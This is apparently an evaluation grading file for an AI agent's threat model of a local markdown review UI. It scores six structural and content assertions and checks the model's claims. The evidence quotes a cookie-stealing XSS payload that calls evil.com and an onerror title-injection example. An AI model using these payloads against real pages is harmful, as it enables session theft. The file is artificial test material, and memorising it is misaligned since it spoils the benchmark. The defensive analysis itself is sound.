@@ -1,0 +1,103 @@
+{
+  "expectations": [
+    {
+      "text": "Output has all 4 sections: Overview, Trust boundaries, Attack surfaces, Criticality calibration",
+      "passed": false,
+      "evidence": "The THREAT-MODEL.md contains these top-level sections: Scope, Architecture Overview, Threat Catalog (T1-T10), Risk Summary, Priority Remediation. There is no section named 'Trust boundaries', no section named 'Attack surfaces' (threats are organized as a 'Threat Catalog'), and no 'Criticality calibration' section. The scripted check also confirmed: 'Missing sections: Trust boundaries Criticality calibration'. While 'Architecture Overview' partially satisfies an 'Overview' requirement, the document does not use the expected 4-section structure."
+    },
+    {
+      "text": "Trust boundaries section classifies inputs into at least 2 distinct tiers (attacker-controlled vs developer-controlled)",
+      "passed": false,
+      "evidence": "There is no 'Trust boundaries' section in the output. The document implicitly distinguishes trust levels across individual threats -- T1 notes markdown content can come from 'a malicious contributor's RFC' (attacker-controlled), T3 notes the title 'typically comes from the agent (which the user controls), not from external untrusted input' (developer-controlled), and T5 distinguishes local vs remote access. However, these observations are scattered across threat entries rather than organized into a dedicated trust boundaries section with explicit tier classification."
+    },
+    {
+      "text": "Output identifies marked.parse or markdown rendering into innerHTML without sanitization as a risk",
+      "passed": true,
+      "evidence": "Threat T1 ('Stored XSS via Malicious Markdown Content') explicitly identifies this: 'The RFC markdown is parsed by marked.parse() and inserted into the DOM via innerHTML without any HTML sanitization.' It cites specific line numbers (917, 919, 1510, 1700 in review_template.html), provides a concrete exploit example with <img src=x onerror=...>, and rates it Critical severity. The 'Existing Mitigations' field confirms 'None. There is no DOMPurify, no CSP header, no marked sanitizer configuration.'"
+    },
+    {
+      "text": "Output references the specific file review_template.html in an attack surface section",
+      "passed": true,
+      "evidence": "review_template.html is referenced extensively throughout the Threat Catalog. In the Scope section: 'assets/review_template.html -- The client-side HTML/JS that renders RFC markdown and collects user feedback.' In T1: 'review_template.html line 917', 'review_template.html line 919', 'review_template.html line 1510', 'review_template.html line 1700'. In T2: 'review_template.html lines 1029-1037' and 'lines 1717-1727'. In T8 and T9 as well. The scripted check also confirmed this passes."
+    },
+    {
+      "text": "At least one attack surface includes a concrete attacker story with action and impact",
+      "passed": true,
+      "evidence": "Multiple threats include concrete attacker stories. T1 provides: 'An RFC markdown document containing: <img src=x onerror=\"fetch(https://evil.com/steal?cookie=...)\"> will execute the JavaScript in the onerror handler when rendered.' Impact: 'Exfiltrate feedback data via network requests... Modify the rendered RFC to show different content... Inject fake Approve button behavior that silently approves while showing rejection.' T5 provides: 'A malicious website could silently submit approved feedback to the local server while the user has the review UI open.' T3 provides: 'A repository named My Project<img src=x onerror=alert(1)> would inject HTML.'"
+    },
+    {
+      "text": "Criticality section acknowledges that the review UI runs on localhost, affecting severity",
+      "passed": false,
+      "evidence": "There is no dedicated 'Criticality calibration' or 'Criticality' section in the output. The document does acknowledge localhost impact on severity in scattered places: T4 states 'Requires local access (server binds to 127.0.0.1) and the file path is constrained'; T8 states 'localhost-only service reduces the attack surface for MITM'; the Risk Summary table notes exploitability constraints. However, the expectation asks for a 'Criticality section' which does not exist as a distinct organizational element. The severity reasoning is distributed across individual threat entries rather than consolidated."
+    }
+  ],
+  "summary": {
+    "passed": 3,
+    "failed": 3,
+    "total": 6,
+    "pass_rate": 0.5
+  },
+  "timing": {
+    "total_tokens": 81077,
+    "executor_duration_seconds": 235.5
+  },
+  "claims": [
+    {
+      "claim": "10 threats were identified, sorted by severity",
+      "type": "factual",
+      "verified": true,
+      "evidence": "The Threat Catalog contains exactly T1 through T10, ordered: 1 Critical (T1), 1 High (T2), 4 Medium (T3-T6), 4 Low (T7-T10). This matches the transcript's summary."
+    },
+    {
+      "claim": "marked.parse is called at 3 sites without sanitization",
+      "type": "factual",
+      "verified": true,
+      "evidence": "T1 in the output cites line 917 (batch mode), line 1510 (live mode), and line 1700 (SSE update) -- 3 call sites. The transcript Step 5 confirms 'found 3 call sites, none with sanitization.'"
+    },
+    {
+      "claim": "The server binds to 127.0.0.1 (localhost only)",
+      "type": "factual",
+      "verified": true,
+      "evidence": "Stated in transcript Step 2 and confirmed in the Architecture Overview section of the output: 'local HTTP server, 127.0.0.1:3118'."
+    },
+    {
+      "claim": "No DOMPurify, no CSP, no marked sanitizer configuration exists",
+      "type": "factual",
+      "verified": true,
+      "evidence": "Transcript Step 3 confirms: 'No DOMPurify, no CSP, no marked sanitizer configuration.' Step 5 confirms escapeHtml is used only for feedback/heading text, not markdown rendering."
+    },
+    {
+      "claim": "Mermaid's bundled DOMPurify 3.3.1 could be reused",
+      "type": "factual",
+      "verified": false,
+      "evidence": "The output claims 'The bundled mermaid.min.js already includes DOMPurify 3.3.1' in T1's recommendation. This is plausible for Mermaid v11 but the specific version 3.3.1 cannot be verified from the transcript or outputs alone."
+    },
+    {
+      "claim": "Title escaping only replaces double-quotes, missing other HTML special characters",
+      "type": "factual",
+      "verified": true,
+      "evidence": "T3 cites the exact code: 'title.replace(/\"/g, \"&quot;\")' in TS and 'title.replace('\"', \"&quot;\")' in Python. The transcript Step 2 also notes: 'Title injection uses only \" -> &quot; replacement, missing <, >, &, '.'"
+    }
+  ],
+  "user_notes_summary": {
+    "uncertainties": [],
+    "needs_review": [],
+    "workarounds": ["Large HTML file (1823 lines) required 7 chunked reads with offset/limit parameters"]
+  },
+  "eval_feedback": {
+    "suggestions": [
+      {
+        "assertion": "Output has all 4 sections: Overview, Trust boundaries, Attack surfaces, Criticality calibration",
+        "reason": "This assertion checks for a specific document structure (4 named sections) that is characteristic of a particular threat modeling methodology. Without a skill guiding the structure, the baseline agent naturally produces a different but arguably effective structure (Scope, Architecture, Threat Catalog, Risk Summary, Remediation). Consider whether the eval is testing for structural compliance (which measures skill adherence) versus analytical completeness (which measures quality). For a 'without_skill' baseline run, failing on structure is expected and informative -- this is a good discriminating assertion."
+      },
+      {
+        "reason": "No assertion checks the depth or quality of the threat analysis itself -- e.g., whether the output identifies the correct number of distinct attack vectors, whether severity ratings are reasonable, or whether remediation advice is actionable. The without_skill baseline produced a thorough 10-threat analysis with concrete code references, which arguably exceeds many skill-guided outputs in analytical depth. An assertion like 'Output identifies at least 3 distinct attack vectors with specific code locations' would measure analytical quality independently of document structure."
+      },
+      {
+        "assertion": "Criticality section acknowledges that the review UI runs on localhost, affecting severity",
+        "reason": "The output does acknowledge localhost impact on severity (in T4, T8, T9, and the Risk Summary), but fails because it is not in a dedicated 'Criticality section.' This is a good discriminating assertion for skill compliance since the skill presumably mandates this section. However, consider splitting it into two assertions: one for structural presence of the section, and one for the analytical content about localhost severity impact -- this would let you separately measure structure vs. insight."
+      }
+    ],
+    "overall": "The assertions are well-designed for measuring skill compliance: they test for a specific document structure that a skill would enforce. The 50% pass rate for the without_skill baseline is a healthy signal -- it means the skill adds structural value while the baseline still captures some analytical substance. The structural assertions (1, 2, 6) all fail while the content assertions (3, 4, 5) all pass, which is exactly the discriminating pattern you want to see."
+  }
+}
